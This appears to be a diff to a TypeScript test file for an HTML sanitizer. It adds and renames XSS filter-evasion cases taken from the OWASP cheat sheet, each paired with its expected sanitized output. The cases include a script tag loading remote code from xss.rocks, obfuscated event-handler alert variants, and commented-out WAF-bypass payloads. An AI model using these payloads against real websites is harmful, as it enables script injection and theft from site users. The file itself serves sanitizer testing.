@@ -2,10 +2,35 @@
  | XSS Filter Evasion Examples
  |
  | Using examples from the XSS Filter Evasion Cheat Sheet (https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- | by Robert "RSnake" Hansen
+ | Updated 3/21/22
+ | originally by Robert "RSnake" Hansen
  | Last revision (mm/dd/yy): 7/4/2018
  | License: Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) (https://creativecommons.org/licenses/by-sa/4.0/)
 */
+
+/*
+TBD?
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#div-background-image-with-unicoded-xss-exploit
+{
+  'label': 'DIV Background-image with Unicoded XSS Exploit',
+  'example': '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
+}
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#downlevel-hidden-block
+{
+  'label': 'Downlevel-Hidden Block',
+  'example': '<!--[if gte IE 4]><SCRIPT>alert(\'XSS\');</SCRIPT><![endif]-->',
+}
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#waf-bypass-strings-for-xss
+{
+  'label': 'WAF ByPass Strings for XSS 27',
+  'example': '<<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
+  'cleanedHtml': ''
+}
+*/
+
 /*--------------------------------------------------------------------------------------------------------------------*/
 
 export interface IXSSTestCase {
@@ -15,6 +40,10 @@ export interface IXSSTestCase {
 }
 
 export const testCases: IXSSTestCase[] = [{
+  'label': 'Basic XSS Test Without Filter Evasion',
+  'example': '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
+  'cleanedHtml': '&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'
+}, {
   'label': 'XSS Locator',
   'example': '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";' +
     'alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>' +
@@ -337,7 +366,7 @@ export const testCases: IXSSTestCase[] = [{
   'example': '<APPLET TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></APPLET>',
   'cleanedHtml': '&lt;APPLET TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/APPLET&gt;'
 }, {
-  'label': 'Using an EMBED tag you can embed a Flash movie that contains XSS',
+  'label': 'EMBED a Flash Movie That Contains XSS',
   'example': '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains ' +
     'XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking=' +
     '"internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" ' +
@@ -347,7 +376,7 @@ export const testCases: IXSSTestCase[] = [{
     'allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info)' +
     '.:org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;'
 }, {
-  'label': 'You can EMBED SVG which can contain your XSS vector',
+  'label': 'EMBED SVG Which Contains XSS Vector',
   'example': '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDA' +
     'vc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xO' +
     'Tk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2' +
@@ -359,7 +388,7 @@ export const testCases: IXSSTestCase[] = [{
     'BpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="' +
     ' type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;'
 }, {
-  'label': 'XML data island with CDATA obfuscation',
+  'label': 'XML Data Island with CDATA Obfuscation',
   'example': '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>' +
     '<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
   'cleanedHtml': '&lt;XML ID="xss"&gt;<i><b><img src></b></i>&lt;/XML&gt;<span></span>'
@@ -628,5 +657,17 @@ export const testCases: IXSSTestCase[] = [{
 }, {
   'label': 'Filter Bypass Alert Obfuscation 8',
   'example': '<IMG onmouseover="top[8680439..toString(30)](1)">',
+  'cleanedHtml': '<img>'
+}, {
+  'label': 'Filter Bypass Alert Obfuscation 9',
+  'example': '<IMG onmouseover="alert?.()">',
+  'cleanedHtml': '<img>'
+}, {
+  'label': 'Filter Bypass Alert Obfuscation 10',
+  'example': '<IMG onmouseover="`${alert``}`">',
+  'cleanedHtml': '<img>'
+}, {
+  'label': 'Filter Bypass Alert Obfuscation 11',
+  'example': '<IMG onmouseover="(alert())">',
   'cleanedHtml': '<img>'
 }];
